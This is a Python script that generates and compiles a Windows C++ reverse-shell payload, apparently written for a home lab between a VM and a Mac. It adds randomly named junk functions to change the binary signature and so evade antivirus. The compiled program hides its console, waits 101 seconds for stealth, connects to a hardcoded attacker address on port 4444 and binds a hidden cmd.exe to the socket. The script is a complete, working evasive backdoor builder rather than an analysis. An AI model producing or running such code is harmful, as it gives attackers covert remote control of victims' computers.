import os
import random
import string
import subprocess

def generate_junk():
    """Generates a random C++ function to change the binary signature."""
    func_name = ''.join(random.choices(string.ascii_letters, k=8))
    return f"""
void {func_name}() {{
    int x = {random.randint(1, 1000)};
    int y = {random.randint(1, 1000)};
    if (x + y > 2000) {{ printf("%d", x); }}
}}
"""

def generate_cpp_source(ip, port):
    junk = "\n".join([generate_junk() for _ in range(5)])
    
    # WINDOWS VERSION: Connects FROM VM TO MAC
    cpp_code = f"""
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

{junk}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{

    FreeConsole();
    // STEALTH DELAY (101 Seconds)
    Sleep(101000); 

    // WINSOCK STARTUP
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    // CREATE WINDOWS SOCKET
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons({4444});
    
    // This is your Mac's IP address (the Attacker)
    serv_addr.sin_addr.s_addr = inet_addr("192.168.64.1");

    // CONNECT BACK TO MAC
    if (WSAConnect(sock, (SOCKADDR*)&serv_addr, sizeof(serv_addr), NULL, NULL, NULL, NULL) == 0) {{
        STARTUPINFOA si = {{0}};
        PROCESS_INFORMATION pi = {{0}};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        
        // Redirect the Windows CMD to the Mac terminal
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        char cmd[] = "cmd.exe"; 
        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }}
    return 0;
}}
"""
    with open("payload.cpp", "w") as f:
        f.write(cpp_code)

def compile_payload(output_name):
    # This is the script that "loads the books" for the compiler
    vcvars_path = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
    
    print(f"[*] Compiling {output_name} via Environment Shell...")
    
    # We combine the setup script AND the compile command into one string
    # The '&&' means "if the first part works, do the second part"
    compile_cmd = (
    f'"{vcvars_path}" && '
    f'cl /O2 /Fe:{output_name} payload.cpp user32.lib ws2_32.lib '
    f'/link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup'
    )
    
    result = subprocess.run(compile_cmd, capture_output=True, text=True, shell=True)
    
    if result.returncode == 0:
        print(f"[+] {output_name} generated successfully!")
    else:
        print(f"[-] Build failed: {result.stderr}")


if __name__ == "__main__":
    # Use your Mac's IP address (the 'Attacker' machine)
    generate_cpp_source("192.168.64.1", 4444) 
    compile_payload("polymorphic_shell.exe")
